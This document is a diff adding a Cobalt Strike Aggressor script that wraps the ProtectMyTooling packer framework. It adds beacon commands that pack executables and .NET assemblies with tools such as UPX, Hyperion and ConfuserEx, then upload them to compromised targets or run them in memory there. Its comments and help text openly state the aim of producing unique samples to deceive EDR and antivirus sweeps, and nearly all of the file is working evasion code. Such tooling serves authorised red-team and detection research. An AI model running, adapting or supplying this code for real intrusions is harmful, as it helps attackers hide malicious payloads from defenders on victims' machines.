@@ -1,0 +1,814 @@
+#
+# ProtectMyTooling
+#
+# A script that integrates a script named "ProtectMyTooling.py" used as a wrapper around
+# configured PE/.NET Packers/Protectors in order to easily transform input executable file into its
+# output, protected and compressed form to then upload or use it from within CobaltStrike.
+#
+# The idea is to have an automated process of protecting all of the uploaded binaries or .NET
+# assemblies used by execute-assembly and forget about protecting or obfuscating them manually
+# before each usage. The added benefit of an automated approach to transform executables is the
+# ability to have the same executable protected each time it's used, resulting in unique samples
+# launched on target machines. That should nicely deceive EDR/AV enterprise-wide IOC sweeps while 
+# looking for the same artefact on different machines.
+#
+# Additionally, the protected-execute-assembly command has the ability to look for assemblies of which
+# only name were given in a preconfigured assemblies directory (set in dotnet_assemblies_directory setting).
+#
+# Author:
+#   Mariusz B. / mgeeky, '20
+#   <mb [at] binary-offensive.com>
+#   (https://github.com/mgeeky)
+#
+
+import java.lang.*;
+
+global('%options $protectedCobaltSettingsFile @supportedProtectMyToolingPackers');
+
+$protectedCobaltSettingsFile = script_resource("cobaltProtectMyTooling.conf");
+
+# These defaults will be overwritten by those from file.
+%options["python3_interpreter_path"]            = "";
+%options["dotnet_assemblies_directory"]         = "";
+%options["protect_my_tooling_dir"]              = script_resource("..");
+%options["protect_my_tooling_config"]           = "";
+%options["protected_executables_cache_dir"]     = "";
+
+%options["cache_protected_executables"]         = "false";
+%options["default_exe_x86_packers_chain"]       = "upx,hyperion";
+%options["default_exe_x64_packers_chain"]       = "upx,hyperion";
+%options["default_dll_x86_packers_chain"]       = "upx,hyperion";
+%options["default_dll_x64_packers_chain"]       = "upx,hyperion";
+%options["default_dotnet_packers_chain"]        = "confuserex";
+
+
+# No need to update that list, it will get filled automatically.
+@supportedProtectMyToolingPackers = @();
+
+#
+# ==============================================================================================
+#
+
+
+beacon_command_register(
+    "protected-upload",
+    "Takes an input file, protects it if its PE executable and then uploads that file to specified remote location.",
+    "Use: protected-upload </local/path/to/file> [/remote/path/to/file]\n\nUpload a protected file from local path (first argument) to remote path (second argument, optional).\n\nIf the file about to be uploaded is a valid PE executable, it will be firstly subject for ProtectMyTooling.py script\nthat would pass the file to configured packers. Generated output artefact would then be uploaded to the target machine.");
+
+beacon_command_register(
+    "protected-execute-assembly",
+    "Execute a local, previously protected and compressed .NET program in-memory on target.",
+    "Use: protected-upload </path/to/file.exe|filename> [arguments]\n\nExecutes a local .NET process assembly on target. This command loads the CLR in a temporary
+process and loads the assembly into it.\n\nIf the file about to be uploaded is a valid PE .NET executable, it will be firstly subject for multi-packer.py script that would pass the file to configured .NET packers. Generated output artefact would then be uploaded to the target machine.");
+
+sub interpretSize {
+    local('$s $size');
+    $s = $1;
+
+    if($s == 0) { 
+        $size = ""; 
+    }
+    else if($s < 1024) { 
+        $size .= $s . "B"; 
+    }
+    else if($s < 1024 * 1024) { 
+        $size = round($s / 1024.0, 1);
+        $size .= "KB";
+    }
+    else if($s < 1024 * 1024 * 1024) { 
+        $size = round(($s / 1024.0) / 1024, 1); 
+        $size .= "MB";
+    }
+    else if($s < 1024 * 1024 * 1024 * 1024) { 
+        $size = round((($s / 1024.0) / 1024) / 1024, 1); 
+        $size .= "GB";
+    }
+
+    return $size;
+}
+
+alias protected-execute-assembly {
+    local('$bid $localpath $args $generatedlocalpath');
+    $bid = shift(@_);
+    $localpath = shift(@_);
+    $args = join(" ", @_);
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        prompt_file_open("Choose an assembly to execute", $null, false, lambda({
+            bupload($bid, $1);
+        }, $bid => $bid));
+        return;
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        berror($bid, "Assembly path must be specified.");
+        return;
+    }
+
+    if(!-exists $localpath) {
+        if(strlen(%options["dotnet_assemblies_directory"]) > 0) {
+            if(-exists getFileProper(%options["dotnet_assemblies_directory"], $localpath)) {
+                $localpath = getFileProper(%options["dotnet_assemblies_directory"], $localpath);
+            }
+            else if(-exists getFileProper(%options["dotnet_assemblies_directory"], $localpath . ".exe")) {
+                $localpath = getFileProper(%options["dotnet_assemblies_directory"], $localpath . ".exe");
+            }
+            else {
+                berror($bid, "Specified assembly file could not be found: ( $+ $localpath $+ )");
+                return;
+            }
+
+            blog($bid, "Auto-located specified .NET assembly at: " . $localpath);
+        }
+        else {
+            berror($bid, "Specified assembly file does not exist: ( $+ $localpath $+ )");
+            return;
+        }
+    }
+
+    try {
+        $generatedlocalpath = executePacker($1, $localpath);
+    }
+    catch $message {
+        berror($bid, "Could not generated protected variant of file to be uploaded. Error: $message");
+        return;
+    }
+
+    btask($bid, "Tasked beacon to run a protected .NET program: \c7" . getFileName($generatedlocalpath) . " $args \o");
+    bexecute_assembly!($bid, $generatedlocalpath, $args);
+}
+
+alias protected-upload {
+    local('$bid $f $localpath $remotepath $content $generatedlocalpath');
+    ($bid, $localpath, $remotepath) = @_;
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        prompt_file_open("Choose a file", $null, false, lambda({
+            bupload($bid, $1);
+        }, $bid => $bid));
+        return;
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        berror($1, "Source file path (local path) must be specified.");
+        return;
+    }
+
+    if(!-exists $localpath) {
+        berror($1, "Specified input file does not exist: ( $+ $localpath $+ )");
+        return;
+    }
+
+    try {
+        $generatedlocalpath = executePacker($1, $localpath);
+    }
+    catch $message {
+        berror($1, "Could not generated protected variant of file to be uploaded. Error: $message");
+        return;
+    }
+
+    try {
+        $f = openf($generatedlocalpath);
+        $content = readb($f, -1);
+        if($content is $null) {
+            throw "Read empty file";
+        }
+        closef($f);
+    }
+    catch $message { 
+        berror($1, "Could not read contents of file to upload. Error: $message (file path: $generatedlocalpath )");
+        return;
+    }
+
+    if($remotepath is $null || strlen($remotepath) == 0) {
+        $remotepath = getFileName($localpath);
+        btask($1, "Tasked Beacon to upload a protected file (size: " . interpretSize(strlen($content)) . "): $generatedlocalpath as $remotepath");
+        bupload_raw!($1, $remotepath, $content, $generatedlocalpath);
+        return;
+    }
+
+    btask($1, "Tasked Beacon to upload a protected file (size: " . interpretSize(strlen($content)) . ") from: ( $+ $generatedlocalpath $+ ) to: ( $+ $remotepath $+ )");
+    bupload_raw!($1, $remotepath, $content, $generatedlocalpath);
+}
+
+sub help {
+    # ==============================================================================================
+
+    local('$hlp');
+
+    $hlp = "\n";
+
+    $hlp .= "A script that integrates \"ProtectMyTooling.py\" used as a wrapper around\n";
+    $hlp .= "configured PE/.NET Packers/Protectors in order to easily transform input executables into their\n";
+    $hlp .= "protected and compressed output forms and then upload or use them from within CobaltStrike.\n";
+    $hlp .= "\n";
+    $hlp .= "The idea is to have an automated process of protecting all of the uploaded binaries or .NET\n";
+    $hlp .= "assemblies used by execute-assembly and forget about protecting or obfuscating them manually\n";
+    $hlp .= "before each usage. The added benefit of an automated approach to transform executables is the\n";
+    $hlp .= "ability to have the same executable protected each time it's used, resulting in unique samples\n";
+    $hlp .= "launched on target machines. That should nicely deceive EDR/AV enterprise-wide IOC sweeps while \n";
+    $hlp .= "looking for the same artefact on different machines.\n";
+    $hlp .= "\n";
+    $hlp .= "Additionally, the protected-execute-assembly command has the ability to look for assemblies of which\n";
+    $hlp .= "only name were given in a preconfigured assemblies directory (set in dotnet_assemblies_directory setting).\n";
+    $hlp .= "\n";
+    $hlp .= "Settings:\n";
+    $hlp .= "    * python3_interpreter_path - Specify a path to Python3 interpreter executable\n";
+    $hlp .= "    * protect_my_tooling_dir - Specify a path to ProtectMyTooling main directory\n";
+    $hlp .= "    * protect_my_tooling_config - Specify a path to ProtectMyTooling configuration file with various packers options\n";
+    $hlp .= "    * dotnet_assemblies_directory - Specify local path .NET assemblies should be looked for if not found by execute-assembly\n";
+    $hlp .= "\n";
+    $hlp .= "    * cache_protected_executables - Enable to cache already protected executables and reuse them when needed\n";
+    $hlp .= "    * protected_executables_cache_dir - Specify a path to a directory that should store cached protected executables\n";
+    $hlp .= "\n";
+    $hlp .= "    * default_exe_x86_packers_chain - Native x86 EXE executables protectors/packers chain\n";
+    $hlp .= "    * default_exe_x64_packers_chain - Native x64 EXE executables protectors/packers chain\n";
+    $hlp .= "    * default_dll_x86_packers_chain - Native x86 DLL executables protectors/packers chain\n";
+    $hlp .= "    * default_dll_x64_packers_chain - Native x64 DLL executables protectors/packers chain\n";
+    $hlp .= "    * default_dotnet_packers_chain - .NET executables protectors/packers chain\n";
+    $hlp .= "\n";
+    $hlp .= "Supported by ProtectMyTooling packers - take a note that only ones that you configured in protect_my_tooling_config will actually work (!):\n";
+    $hlp .= "    - confuserex     - An open-source protector for .NET applications\n";
+    $hlp .= "    - enigma         - (paid) The Engima Protector is an advanced x86/x64 PE Executables protector with many anti-features and virtualization\n";
+    $hlp .= "    - hyperion       - Robust PE EXE runtime AES encrypter for x86/x64 with own-key brute-forcing logic.\n";
+    $hlp .= "    - intellilock    - (paid) Eziriz Intellilock is an advanced .Net (x86+x64) assemblies protector.\n";
+    $hlp .= "    - netreactor     - (paid) A powerful code protection system for the .NET Framework including various obfuscation & anti- techniques\n";
+    $hlp .= "    - netshrink      - (paid) PELock .netshrink is an .Net EXE packer with anti-cracking feautres and LZMA compression\n";
+    $hlp .= "    - pecloak        - A Multi-Pass x86 PE Executables encoder by Mike Czumak | T_V3rn1x | @SecuritySift\n";
+    $hlp .= "    - smartassembly  - (paid) A powerful code protection system for the .NET Framework including various obfuscation & anti- techniques\n";
+    $hlp .= "    - themida        - (paid) Advanced x86/x64 PE Executables virtualizer, compressor, protector and binder.\n";
+    $hlp .= "    - upx            - Universal PE Executables Compressor - highly reliable, works with x86 & x64.\n";
+    $hlp .= "    - vmprotect      - (paid) VMProtect protects x86/x64 code by virtualizing it in complex VM environments.\n";
+    $hlp .= "\n";
+
+    # ===========================================================================================================
+
+    show_message($hlp);
+}
+
+sub clearCacheFolder {
+    local('$localpath $cmdline $logfile $scriptPath $python');
+
+    if ((%options["protected_executables_cache_dir"] !is $null) && (strlen(%options["protected_executables_cache_dir"]) > 0 ) && (-exists %options["protected_executables_cache_dir"])) {
+        $python = %options["python3_interpreter_path"];
+        $scriptPath = script_resource("cobaltProtectMyTooling.py");
+        $logfile = getFileProper([System getenv: "TEMP"], "cobaltprotectmytooling.log");
+
+        $cmdline = "\" $+ $python $+ \" \" $+ $scriptPath $+ \" \" $+ $protectedCobaltSettingsFile $+ \" clearcache \" $+ $logfile $+ \"";
+
+        println("[ProtectMyTooling] Clearing cache directory: " . $cmdline);
+        
+        exec($cmdline);
+
+        show_message("Cache directory \"" . %options["protected_executables_cache_dir"] . "\" cleared.");
+    }
+}
+
+sub executePacker {
+    local('$localpath $maxTries $outpath $num $f $output $generatedlocalpath $cmdline $logfile $scriptPath $python');
+
+    $bid = $1;
+    $localpath = $2;
+    $generatedlocalpath = '';
+
+    if(%options["cache_protected_executables"] eq "true") {
+        $generatedlocalpath = getFileProper(%options["protected_executables_cache_dir"], getFileName($localpath));
+
+        if(-exists $generatedlocalpath) {
+            blog2($1, "Reusing cached version of protected " . getFileName($localpath) . ": " . $generatedlocalpath);
+            return $generatedlocalpath;
+        }
+    }
+
+    $python = %options["python3_interpreter_path"];
+    $scriptPath = script_resource("cobaltProtectMyTooling.py");
+    $logfile = getFileProper([System getenv: "TEMP"], "cobaltprotectmytooling.log");
+
+    $cmdline = "\" $+ $python $+ \" \" $+ $scriptPath $+ \" \" $+ $protectedCobaltSettingsFile $+ \" \" $+ $localpath $+ \" \" $+ $logfile $+ \"";
+
+    #println("[ProtectMyTooling] Running packer: " . $cmdline);
+    
+    exec($cmdline);
+    $output = "";
+
+    $maxTries = 10;
+    $num = 0;
+
+    while ($num < $maxTries) {
+        try {
+            $f = openf($logfile);
+            $output = readb($f, -1);
+
+            if ($output is $null) {
+                throw "Read empty file";
+            }
+            closef($f);
+
+            $generatedlocalpath = matches($output, 'OUTPUT-FILE: "([^"]+)"');
+            if ($generatedlocalpath !is $null && size($generatedlocalpath) == 1){
+                if (-exists $generatedlocalpath[0]){
+                    break;
+                } 
+            }
+        }
+        catch $message { 
+            continue;
+        }
+
+        $num += 1;
+        println("[ProtectMyTooling] Waiting for output from cobaltProtectMyTooling.py ...");
+        sleep(1000);
+    }
+
+    $outpath = $generatedlocalpath[0];
+    println("[ProtectMyTooling] Extracted protected file's output path: " . $outpath);
+
+    if (-exists $outpath){
+        blog2($bid, "Using protected version of " . getFileName($localpath) . ": " . $generatedlocalpath[0]);
+
+        try {
+            $f = openf(">$logfile");
+            println($f, "");
+            closef($f);
+        }
+        catch $msg {
+        }
+
+        return $generatedlocalpath[0];
+    }
+    else {
+        #println("ERROR1");
+    }
+
+    berror($1, "Could not extract protected file's path!");
+    berror($1, "[ProtectMyTooling] Output from packer: \n" . $output);
+    
+    return "";
+}
+
+sub checkOptions {
+    local('$err @p $packer');
+
+    if( strlen(%options["python3_interpreter_path"]) == 0) {
+        $err .= "\n\nPython3 interpreter's path is not set.\nPlease set \"protectmytooling.python3_interpreter_path\" option first before using ProtectMyTooling.";
+    }
+    else if(!-exists %options["python3_interpreter_path"]) {
+        $err .= "\n\nFile pointed by \"protectmytooling.python3_interpreter_path\" does not exist.";
+        %options["python3_interpreter_path"] = "";
+    }
+
+    if( strlen(%options["protect_my_tooling_config"]) == 0) {
+        $err .= "\n\nProtectMyTooling configuration file path is not set.\nPlease set \"protectmytooling.protect_my_tooling_config\" option first before using ProtectMyTooling.";
+    }
+    else if(!-exists %options["protect_my_tooling_config"]) {
+        $err .= "\n\nConfig file pointed by \"protectmytooling.protect_my_tooling_config\" does not exist.";
+        %options["protect_my_tooling_config"] = "";
+    }
+
+    if(!-exists %options["dotnet_assemblies_directory"]) {
+        $err .= "\n\nDirectory pointed by \"protectmytooling.dotnet_assemblies_directory\" does not exist.";
+        %options["dotnet_assemblies_directory"] = "";
+    }
+
+    if( strlen(%options["protect_my_tooling_dir"]) == 0) {
+        $err .= "\n\nProtectMyTooling main directory path is not set. That file is crucial for the ProtectMyTooling to work.\nPlease set \"protectmytooling.protect_my_tooling_dir\" option first before using ProtectMyTooling.";
+    }
+    else if(!-exists %options["protect_my_tooling_dir"]) {
+        $err .= "\n\nProtectMyTooling main directory pointed by \"protectmytooling.protect_my_tooling_dir\" does not exist.";
+        %options["protect_my_tooling_dir"] = "";
+    }
+
+    if( strlen(%options["protected_executables_cache_dir"]) == 0) {
+        $err .= "\n\nA path to directory where protected executables should be cached is not set.\nPlease set \"protectmytooling.protected_executables_cache_dir\" option first before using ProtectMyTooling.";
+    }
+    else if(!-exists %options["protected_executables_cache_dir"]) {
+        $err .= "\n\nDirectory pointed by \"protectmytooling.protected_executables_cache_dir\" does not exist.";
+        %options["protected_executables_cache_dir"] = "";
+    }
+
+    if( strlen(%options["dotnet_assemblies_directory"]) == 0) {
+        show_error(".NET directory path for looking up not found assemblies is not set.\nNot having this option set will result in that functionality being disabled. This error is not critical.");
+    }
+
+    @p = split(',', %options["default_exe_x86_packers_chain"]);
+    foreach $packer (@p) {
+        $packer = ["$packer" trim];
+        if ($packer !in @p) {
+            $err .= "\n\nPacker: $packer set in default_exe_x86_packers_chain is not available!\n";
+        }
+    }
+
+    @p = split(',', %options["default_exe_x64_packers_chain"]);
+    foreach $packer (@p) {
+        $packer = ["$packer" trim];
+        if ($packer !in @p) {
+            $err .= "\n\nPacker: $packer set in default_exe_x64_packers_chain is not available!\n";
+        }
+    }
+
+    @p = split(',', %options["default_dll_x86_packers_chain"]);
+    foreach $packer (@p) {
+        $packer = ["$packer" trim];
+        if ($packer !in @p) {
+            $err .= "\n\nPacker: $packer set in default_dll_x86_packers_chain is not available!\n";
+        }
+    }
+
+    @p = split(',', %options["default_dll_x64_packers_chain"]);
+    foreach $packer (@p) {
+        $packer = ["$packer" trim];
+        if ($packer !in @p) {
+            $err .= "\n\nPacker: $packer set in default_dll_x64_packers_chain is not available!\n";
+        }
+    }
+
+    @p = split(',', %options["default_dotnet_packers_chain"]);
+    foreach $packer (@p) {
+        $packer = ["$packer" trim];
+        if ($packer !in @p) {
+            $err .= "\n\nPacker: $packer set in default_dotnet_packers_chain is not available!\n";
+        }
+    }
+
+    if(strlen($err) > 0) {
+        show_error($err);
+        return 0;
+    }
+
+    return 1;
+}
+
+sub showOptionsDialog {
+    local('$dialog');
+
+    $dialog = dialog("ProtectMyTooling options", %options, &updateOptions);
+
+    dialog_description($dialog, "Preferences configuring the way ProtectMyTooling serves its purpose.");
+
+    drow_text($dialog, "python3_interpreter_path", "Specify a path to Python3 interpreter executable: ");
+    drow_text($dialog, "protect_my_tooling_dir", "Specify a path to ProtectMyTooling main directory: ");
+    drow_text($dialog, "protect_my_tooling_config", "Specify a path to ProtectMyTooling configuration file with various packers options: ");
+    drow_text($dialog, "dotnet_assemblies_directory", "Specify local path .NET assemblies should be looked for if not found by execute-assembly: ");
+
+    drow_checkbox($dialog, "cache_protected_executables", "Enable to cache already protected executables and reuse them when needed:", "Cache executables");
+    drow_text($dialog, "protected_executables_cache_dir", "Specify a path to a directory that should store cached protected executables: ");
+
+    drow_text($dialog, "default_exe_x86_packers_chain", "Native x86 EXE executables protectors/packers chain: ");
+    drow_text($dialog, "default_exe_x64_packers_chain", "Native x64 EXE executables protectors/packers chain: ");
+    drow_text($dialog, "default_dotnet_packers_chain", ".NET executables protectors/packers chain: ");
+    drow_text($dialog, "default_dll_x86_packers_chain", "Native x86 DLL executables protectors/packers chain: ");
+    drow_text($dialog, "default_dll_x64_packers_chain", "Native x64 DLL executables protectors/packers chain: ");
+
+    dbutton_action($dialog, "Save settings");
+    dbutton_action($dialog, "Help");
+    dialog_show($dialog);
+}
+
+sub updateOptions{
+    local('%setopts');
+    %setopts = $3;
+    $button = $2;
+
+    if ($button eq "Help") {
+        help();
+        return;
+    }
+
+    %options["python3_interpreter_path"] = %setopts["python3_interpreter_path"];
+    %options["protect_my_tooling_dir"] = %setopts["protect_my_tooling_dir"];
+    %options["protect_my_tooling_config"] = %setopts["protect_my_tooling_config"];
+    %options["dotnet_assemblies_directory"] = %setopts["dotnet_assemblies_directory"];
+    %options["cache_protected_executables"] = %setopts["cache_protected_executables"];
+    %options["protected_executables_cache_dir"] = %setopts["protected_executables_cache_dir"];
+    %options["default_exe_x86_packers_chain"] = %setopts["default_exe_x86_packers_chain"];
+    %options["default_exe_x64_packers_chain"] = %setopts["default_exe_x64_packers_chain"];
+    %options["default_dll_x86_packers_chain"] = %setopts["default_dll_x86_packers_chain"];
+    %options["default_dll_x64_packers_chain"] = %setopts["default_dll_x64_packers_chain"];
+    %options["default_dotnet_packers_chain"] = %setopts["default_dotnet_packers_chain"];
+
+    if(checkOptions() == 1) {
+        show_message("Options saved.");
+    }
+
+    putOptions();
+}
+
+menubar("ProtectMyTooling", "protectmytooling");
+
+popup protectmytooling {
+
+    item "Options" {
+        showOptionsDialog();
+    }
+
+    item "Clear cached executables" {
+        clearCacheFolder();
+    }
+
+    item "Help" {
+        help();
+    }
+
+    item "Save Settings" {
+        putOptions();
+        show_message("Settings saved.");
+    }
+
+    item "Restore Settings" {
+        getOptions();
+        show_message("Settings restored.");
+    }
+}
+
+#
+# saveOptions(
+#   $filename, 
+#   %dictWithOptions, 
+#   [optional]"save.these.options.with.prefix.in.name")
+#
+sub saveOptions {
+    local('$handle $i $newl $updated @savedkeys $append @output @contents $optionsPrefix $fileName %options $p $k $key $val %fetchedOptions');
+    $fileName = $1;
+    %options = $2;
+    $optionsPrefix = $3;
+
+    @output = @();
+    @contents = @();
+
+    if(-exists $fileName) {
+        if(!-canread $fileName) {
+            show_error("Cannot read settings file: $fileName");
+            return;
+        }
+
+        $handle = openf($fileName);
+        if($handle) {
+            while $line (readln($handle)) {
+                $line = ["$line" trim];
+                push(@contents, $line);
+            }
+            closef($handle);
+        }
+    }
+
+    if(!-canwrite $fileName) {
+        show_error("Cannot write to settings file: $fileName");
+        return;
+    }
+
+    $handle = openf(">" . $fileName);
+    if($handle is $null) {
+        show_error("Could not save options: Unable to open/create file.");
+        return;
+    }
+
+    @savedkeys = @();
+    $updated = 0;
+
+    if(size(@contents) > 0) {
+        for($i = 0; $i < size(@contents); $i++) {
+            if(strlen(@contents[$i]) < 2) {
+                push(@output, @contents[$i]);
+                continue;
+            }
+            else if('#*' iswm @contents[$i]) {
+                push(@output, @contents[$i]);
+                continue;
+            }
+
+            if(@contents[$i] ismatch '([^=]+)\s*=\s*(.+)') {
+                ($key, $oldval) = matched();
+                $key = ["$key" trim];
+                $oldval = ["$oldval" trim];
+
+                foreach $key2 (keys(%options)) {
+                    $k = $optionsPrefix . $key2;
+
+                    if($key eq $k) {
+                        $val = %options[$key2];
+                        $val = ["$val" trim];
+
+                        $newl = substr(@contents[$i], 0, indexOf(@contents[$i], $oldval));
+
+                        if(strlen($val) == 0) {
+                            $newl .= "\"\"";
+                        }
+                        else if(indexOf($val, ' ')) {
+                            $newl .= "\" $+ $val $+ \"";
+                        }
+                        else {
+                            $newl .= $val;
+                        }
+
+                        push(@output, $newl);
+                        push(@savedkeys, $key2);
+                        $updated = 1;
+                    }
+                }
+            }
+
+            if($updated == 0) {
+                push(@output, @contents[$i]);
+            }
+        }
+
+        foreach $key (keys(%options)) {
+            if($key in @savedkeys) {
+                continue;
+            }
+
+            $k = $optionsPrefix . $key;
+            $val = %options[$key];
+            $val = ["$val" trim];
+
+            $newl = "$k = ";
+
+            if(strlen($val) == 0) {
+                $newl .= "\"\"";
+            }
+            else if(indexOf($val, ' ')) {
+                $newl .= "\" $+ $val $+ \"";
+            }
+            else {
+                $newl .= $val;
+            }
+
+            push(@output, $newl);
+        }
+    }
+    else {
+        foreach $key (keys(%options)) {
+            $k = $optionsPrefix . $key;
+            $val = %options[$key];
+            $val = ["$val" trim];
+
+            if(strlen($val) == 0) {
+                push(@output, "$k = \"\"");
+            }
+            else if(indexOf($val, ' ')) {
+                push(@output, "$k = \" $+ $val $+ \"");
+            }
+            else {
+                push(@output, "$k = $val");
+            }
+        }
+    }
+
+    printAll($handle, @output);
+    closef($handle);
+}
+
+#
+# %fetchedOptionsDict = loadOptions(
+#   $filename, 
+#   [optional]"load.only.options.with.prefix.in.name"
+# )
+#
+sub loadOptions {
+    local('$handle @lines $fileName $p $key $loadPrefix $val %fetchedOptions');
+    $fileName = $1;
+    $loadPrefix = $2;
+    %fetchedOptions = %();
+
+    if(!-exists $fileName) {
+        #show_error("No saved settings file ( $+ $fileName $+ )!");
+
+        # create a new, empty file.
+        try
+        {
+            $handle = openf(">" . $fileName);
+            closef($handle);
+        } catch $m {
+        }
+        return $null;
+    }
+
+    if(!-canread $fileName) {
+        show_error("Cannot read settings file: $fileName");
+        return $null;
+    }
+
+    $handle = openf($fileName);
+    while $line (readln($handle)) {
+        push(@lines, ["$line" trim]);
+    }
+
+    closef($handle);
+ 
+    for($lineNum = 0; $lineNum < size(@lines); $lineNum++) {
+        $line = @lines[$lineNum];
+
+        if(strlen($line) <= 2) {
+            continue;
+        }
+        else if('#*' iswm $line) {
+            continue;
+        }
+
+        $p = indexOf($line, '=');
+        if ($p) {
+
+            $key = substr($line, 0, $p);
+            $key = ["$key" trim];
+
+            $val = substr($line, $p + 1);
+            $val = ["$val" trim];
+
+            if(strlen($key) == 0) {
+                show_error("Error in config file ( $+ $fileName $+ ) in line $lineNum $+ :\nLine does not conform 'key = value' form, as there is no key:\n\n $line");
+                return $null;
+            }
+
+            if(right($val, 1) eq ";") {
+                $val = substr($val, 0, -1);
+            }
+
+            if(left($val, 1) eq '"') {
+                if(right($val, 1) eq '"') {
+                    $val = substr($val, 1, -1);
+                }
+                else {
+                    show_error("Error in config file ( $+ $fileName $+ ) in line $lineNum $+ :\nUnclosed quote mark on line:\n\n $line");
+                    return $null;
+                }
+            }
+
+            if($loadPrefix && strlen($loadPrefix) > 0) {
+                if(indexOf($key, $loadPrefix) != 0) {
+                    continue;
+                }
+            }
+
+            if($key && strlen($key) > 0) {
+                %fetchedOptions[$key] = $val;
+            }
+            else {
+                %fetchedOptions[$key] = "";
+            }
+        }
+        else {
+            show_error("Error in config file ( $+ $fileName $+ ) in line $lineNum $+ :\nNo 'key = value' assignment in line:\n\n $line");
+            return $null;
+        }
+    }
+
+    return %fetchedOptions;
+}
+ 
+
+#
+# ==============================================================================================
+#
+
+sub fillPackersList {
+    local('@files $file');
+
+    if (size(@supportedProtectMyToolingPackers) > 0 ) {
+        return;
+    }
+
+    if ((%options['protect_my_tooling_dir'] !is $null) && (-exists %options['protect_my_tooling_dir'])) {
+        @files = ls(getFileProper(%options['protect_my_tooling_dir'], 'packers'));
+
+        foreach $file (@files) {
+            $file = getFileName($file);
+            if ($file eq "__init__.py")  { continue; }
+            if ($file eq "IPacker.py")  { continue; }
+            if ("*__pycache__*" iswm $file)  { continue; }
+
+            $file = replace($file, ".py", "");
+            push(@supportedProtectMyToolingPackers, $file);
+        }
+    }
+
+    println("[ProtectMyTooling] Available Packers: " . join(", ", @supportedProtectMyToolingPackers));
+}
+
+sub getOptions {
+    local('%opts $pos');
+
+    %opts = loadOptions($protectedCobaltSettingsFile);
+
+    if(size(%opts) > 0) {
+        $pos = strlen("protectmytooling.");
+        foreach $key (keys(%opts)) {
+            if("protectmytooling.*" iswm $key) {
+                $k = substr($key, $pos);
+                %options[$k] = %opts[$key];
+            }
+        }
+    }
+
+    fillPackersList();
+
+    println("[ProtectMyTooling] Options loaded from " . $protectedCobaltSettingsFile);
+}
+
+sub putOptions {
+    saveOptions($protectedCobaltSettingsFile, %options, "protectmytooling.");
+    fillPackersList();
+
+    println("[ProtectMyTooling] Options saved to " . $protectedCobaltSettingsFile);
+}
+
+getOptions();
